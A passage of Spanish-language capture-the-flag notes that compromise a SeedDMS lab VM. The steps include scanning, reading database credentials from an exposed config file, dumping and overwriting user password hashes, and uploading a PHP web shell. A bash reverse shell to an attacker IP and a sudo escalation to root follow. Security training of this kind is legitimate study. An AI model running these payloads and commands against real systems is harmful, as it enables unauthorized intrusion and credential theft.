nmap -sn 192.168.1.1/24

Target 192.168.1.113 

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.113 -oG ./nmap/allPorts

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
3306/tcp  open  mysql   syn-ack ttl 64
33060/tcp open  mysqlx  syn-ack ttl 64
MAC Address: 08:00:27:4E:35:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

```

Nos vamos al navegador para revisar el sitio web 
Hacemos directory traversal con gobuster pero no detectamos nada así que revisaremos el código Crtl+U nos muestra el código del sitio web, en main.js nos encontramos con unos comentarios útiles  en el fichero main.js e investigamos tanto la ruta como la info de seeddms-5.1.22

```
 // give active class to first link
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

Probamos lo encontrado en la url y nos redirije a una pag de login
```
http://192.168.1.113/seeddms51x/seeddms-5.1.22/
```


Buscamos pass y user por defecto haciendo esta busqueda en google
```
seeddms-5.1.22 default user and password
```

Buscamos si es open source para ver si podemos entender su estructura de directorios, lo encontramos en gihub  https://github.com/JustLikeIcarus/SeedDMS
 donde encontramos una estructura de directorio para el software.
 ![[Pasted image 20251005125916.png]]

Haremos una inspeccion de directorions con gobuster
```
gobuster dir -u http://192.168.1.113/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 

/www                  (Status: 301) [Size: 323] [--> http://192.168.1.113/seeddms51x/www/]
/data                 (Status: 301) [Size: 324] [--> http://192.168.1.113/seeddms51x/data/]
/conf                 (Status: 301) [Size: 324] [--> http://192.168.1.113/seeddms51x/conf/]
/pear                 (Status: 301) [Size: 324] [--> http://192.168.1.113/seeddms51x/pear/]

En la carpeta conf buscamos archivos de interes
gobuster dir -u http://192.168.1.113/seeddms51x/conf/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -t 20

Encontramos un archivo interesante
/settings.xml         (Status: 200) [Size: 12377]

http://192.168.1.113/seeddms51x/conf/settings.xml

Encontramos un user y una pass en este archivo
dbDriver="mysql" 
dbHostname="localhost"
dbDatabase="seeddms" 
-- dbUser="seeddms" --
-- dbPass="seeddms" --

Nos intentamos conectar al mysql con el user y el pass obtenidos

mysql -u seeddms -p -h 192.168.1.113

Nos topamos con este error 

ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain

Lo solventamos con este comando y logramos conectarnos
mysql -u seeddms -p -h 192.168.1.113 --ssl=0 



```

Ver las tablas de la BD a la cual nos conectamos
```
MySQL [seeddms]> show tables;
```

Seleccionar lo que queramos de las tablas
```
MySQL [seeddms]> show tables;select * from users;

```

+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1               | saket                                   | saurav                               | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+

Buscamos como esta estructurada otra tabla que involucra a ususarios y extraemos lo que nos interesa
Para ver como esta confomada una tabla de la BD
```
MySQL [seeddms]> describe tblUsers;
```

```
MySQL [seeddms]> select id,login,pwd,email,role from tblUsers;
+----+-------+----------------------------------+--------------------+------+
| id | login | pwd                              | email              | role |
+----+-------+----------------------------------+--------------------+------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a | address@server.com |    1 |
|  2 | guest | NULL                             | NULL               |    2 |
+----+-------+----------------------------------+--------------------+------+

```
 
 Intentamos modificar el hash a uno de nuesta conveniencia
```
 Nos creamos una en md5 y la actualisaremos 
 echo -n "pass123" | md5sum 
32250170a0dca92d53ec9624f336ca24 

Modificamos la pass 
MySQL [seeddms]> update tableUsers set pwd='32250170a0dca92d53ec9624f336ca24' where login='admin';
```

Logramos entrar al sitio encontrado con el user y pass que modificamos

Hacemos una busqueda con serch
```
searchsploit seeddms 

Encontramos 
SeedDMS versions < 5.1.11 - Remote Command Execution    | php/webapps/47022.txt

Lo descargamos y nos da indicacione para ejecutar el exploit 
searchsploit -m 47022
```

Hacemos lo que nos indica y luego intentamos ejecutar codigo mediane la url
```
Nos creamos un scrip de php que nos permita ejecutar codigo en el servidor
Creamos un fichero    cmd.php  y le agregamos

Averiguar que son las etiquetas preformateadas
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . " </pre>";
?>

Lo subimos al servidor y basandonos en las indicaciones del exploit que descargamos ejecutamos

http://192.168.1.113/seeddms51x/data/1048576/4/1.php?cmd=cat+/etc/passwd
Donde el numero 4 es el id de nuestro archivo

Obtenemos el /etc/passwd de la maquina en este punto y pudiendo ejecutar codigo nos crearemos un reverse shell

```

Ponemos a escuchar por un puerto o mejor nos vamos al sitio de reverse shell 
https://www.revshells.com/
 Nos creamos un shell y la enviamos por parametro importante pasar esta shel reverse de la manera siguiente
```
1 - Nos ponemos a la escucha con nc

sudo nc -lvnp 443

2 - Pasamos el comando por url

Bash a ejecutar = bash -i >& /dev/tcp/192.168.1.108/443 0>&1
 
 cmd=bash -c "bash -i >& /dev/tcp/192.168.1.108/443 0>&1"
 
 Pero la hacemos un URLEncode para que el navegador no cause problemas
Bash URLEncode =  bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.108%2F443%200%3E%261
 
 Le decimos que vamos a ejecuar el codigo entre comillas
 Parametro cmd pasado por la url
 cmd=bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.108%2F443%200%3E%261"
  
```

Obtenemos una tty avanzada
Los pasos se tiran tal cual es fijo
[[Migrar a una TTY]]

Nos movemos al home para ver que tenemos
```
cd /home
www-data@ubuntu:/home$ ls
saket
```

De este usuario encontramos en la base de datos en la tabla user una pass en texto plano se puede ver mas arriba y nos intentamos loguear con este usuario
```
su saket 

Ponemos su pass luego hacemos un 
sudo -l   #Es un usario con privilegios elevados 
saket@ubuntu:~$ sudo -l
[sudo] password for saket: 
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL

Hacemos sudo su y ya estamos como administrador

```

